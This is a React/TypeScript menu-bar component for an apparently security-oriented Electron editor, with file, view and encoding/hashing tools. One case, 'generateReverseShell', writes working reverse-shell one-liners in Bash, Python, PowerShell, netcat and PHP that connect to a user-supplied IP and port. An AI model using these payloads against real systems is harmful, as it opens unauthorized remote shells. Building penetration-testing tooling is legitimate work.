import React, { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './MenuBar.module.css';

interface MenuItem {
  label?: string;
  shortcut?: string;
  action?: string | (() => void);
  separator?: boolean;
}

const MenuBar: React.FC = () => {
  const [activeMenu, setActiveMenu] = useState<string | null>(null);
  const { 
    toggleLeftSidebar, 
    toggleRightSidebar, 
    openSettings, 
    openAbout,
    closeTab,
    closeAllTabs,
    activeTabId,
    tabs,
    toggleTerminal
  } = useStore();

  const menus: Record<string, MenuItem[]> = {
    File: [
      { label: 'Open Folder...', shortcut: 'Ctrl+O', action: 'openFolder' },
      { separator: true },
      { label: 'Save', shortcut: 'Ctrl+S', action: 'save' },
      { label: 'Save All', shortcut: 'Ctrl+Shift+S', action: 'saveAll' },
      { separator: true },
      { label: 'Close Tab', shortcut: 'Ctrl+W', action: 'closeTab' },
      { label: 'Close All Tabs', shortcut: 'Ctrl+Shift+W', action: 'closeAllTabs' },
    ],
    Tools: [
      { label: 'Hash MD5', action: 'hashMD5' },
      { label: 'Hash SHA-256', action: 'hashSHA256' },
      { separator: true },
      { label: 'Encode Base64', action: 'encodeBase64' },
      { label: 'Decode Base64', action: 'decodeBase64' },
      { separator: true },
      { label: 'Encode URL', action: 'encodeURL' },
      { label: 'Decode URL', action: 'decodeURL' },
      { separator: true },
      { label: 'Beautify JSON', action: 'beautifyJSON' },
      { label: 'Minify JSON', action: 'minifyJSON' },
      { separator: true },
      { label: 'Decode JWT', action: 'decodeJWT' },
      { label: 'Generate Reverse Shell', action: 'generateReverseShell' },
    ],
    View: [
      { label: 'Toggle Left Sidebar', shortcut: 'Ctrl+B', action: () => toggleLeftSidebar() },
      { label: 'Toggle Right Sidebar', shortcut: 'Ctrl+Shift+B', action: () => toggleRightSidebar() },
    ],
    Terminal: [
      { label: 'Toggle Terminal', shortcut: 'Ctrl+`', action: () => toggleTerminal() },
    ],
    Help: [
      { label: 'Settings', shortcut: 'Ctrl+,', action: () => openSettings() },
      { label: 'About', action: 'showAbout' },
    ],
  };

  const handleMenuClick = (menuName: string) => {
    setActiveMenu(activeMenu === menuName ? null : menuName);
  };

  const handleItemClick = async (action: string | (() => void)) => {
    if (typeof action === 'function') {
      action();
    } else if (action === 'openFolder') {
      await window.electronAPI?.dialog.selectFolder();
    } else if (action === 'save') {
      if (activeTabId) {
        const tab = tabs.find(t => t.id === activeTabId);
        if (tab?.path) {
          await window.electronAPI?.fs.writeFile(tab.path, tab.content);
        }
      }
    } else if (action === 'saveAll') {
      // Save all modified tabs
      const modifiedTabs = tabs.filter(t => t.modified && t.path);
      for (const tab of modifiedTabs) {
        await window.electronAPI?.fs.writeFile(tab.path, tab.content);
      }
      if (modifiedTabs.length > 0) {
        console.log(`Saved ${modifiedTabs.length} file(s)`);
      }
    } else if (action === 'closeTab') {
      if (activeTabId) closeTab(activeTabId);
    } else if (action === 'closeAllTabs') {
      closeAllTabs();
    } else if (action === 'showAbout') {
      openAbout();
    } else {
      // Tool actions
      await handleToolAction(action);
    }
    setActiveMenu(null);
  };

  const handleToolAction = async (action: string) => {
    const tab = activeTabId ? tabs.find(t => t.id === activeTabId) : null;
    if (!tab) return;
    
    const { updateTabContent } = useStore.getState();
    let result = '';
    
    try {
      switch (action) {
        case 'hashMD5':
          if (window.electronAPI?.crypto) {
            const hash = await window.electronAPI.crypto.hash('md5', tab.content);
            result = hash.hash || 'Error generating hash';
          }
          break;
        case 'hashSHA256':
          if (window.electronAPI?.crypto) {
            const hash = await window.electronAPI.crypto.hash('sha256', tab.content);
            result = hash.hash || 'Error generating hash';
          }
          break;
        case 'encodeBase64':
          result = btoa(tab.content);
          break;
        case 'decodeBase64':
          try {
            result = atob(tab.content);
          } catch {
            result = 'Invalid Base64 input';
          }
          break;
        case 'encodeURL':
          result = encodeURIComponent(tab.content);
          break;
        case 'decodeURL':
          result = decodeURIComponent(tab.content);
          break;
        case 'beautifyJSON':
          try {
            const obj = JSON.parse(tab.content);
            result = JSON.stringify(obj, null, 2);
          } catch {
            result = 'Invalid JSON';
          }
          break;
        case 'minifyJSON':
          try {
            const obj = JSON.parse(tab.content);
            result = JSON.stringify(obj);
          } catch {
            result = 'Invalid JSON';
          }
          break;
        case 'decodeJWT':
          try {
            const parts = tab.content.trim().split('.');
            if (parts.length !== 3) throw new Error('Invalid JWT');
            const header = JSON.parse(atob(parts[0]));
            const payload = JSON.parse(atob(parts[1]));
            result = `JWT Decoded\n\n[Header]\n${JSON.stringify(header, null, 2)}\n\n[Payload]\n${JSON.stringify(payload, null, 2)}\n\n[Signature]\n${parts[2]}`;
          } catch {
            result = 'Invalid JWT token';
          }
          break;
        case 'generateReverseShell': {
          const [ip, port] = tab.content.trim().split(':');
          const p = port || '4444';
          const i = ip || '10.0.0.1';
          result = `# Reverse Shell Payloads for ${i}:${p}\\n\\n` +
            `# Bash\nbash -i >& /dev/tcp/${i}/${p} 0>&1\n\n` +
            `# Python\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'\n\n` +
            `# PowerShell\npowershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${i}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"\n\n` +
            `# Netcat\nnc -e /bin/sh ${i} ${p}\n\n` +
            `# PHP\\nphp -r '$sock=fsockopen(\"${i}\",${p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'`;
          break;
        }
      }
      
      if (result) {
        updateTabContent(tab.id, result);
      }
    } catch (error) {
      console.error('Tool error:', error);
    }
  };

  return (
    <div className={styles.menuBar}>
      {Object.entries(menus).map(([menuName, items]) => (
        <div key={menuName} className={styles.menuContainer}>
          <button
            className={`${styles.menuButton} ${activeMenu === menuName ? styles.active : ''}`}
            onClick={() => handleMenuClick(menuName)}
          >
            {menuName}
          </button>
          {activeMenu === menuName && (
            <div className={styles.dropdown}>
              {items.map((item, idx) =>
                item.separator ? (
                  <div key={`sep-${idx}`} className={styles.separator} />
                ) : (
                  <button
                    key={idx}
                    className={styles.menuItem}
                    onClick={() => item.action && handleItemClick(item.action)}
                  >
                    <span className={styles.label}>{item.label}</span>
                    {item.shortcut && <span className={styles.shortcut}>{item.shortcut}</span>}
                  </button>
                )
              )}
            </div>
          )}
        </div>
      ))}
    </div>
  );
};

export default MenuBar;
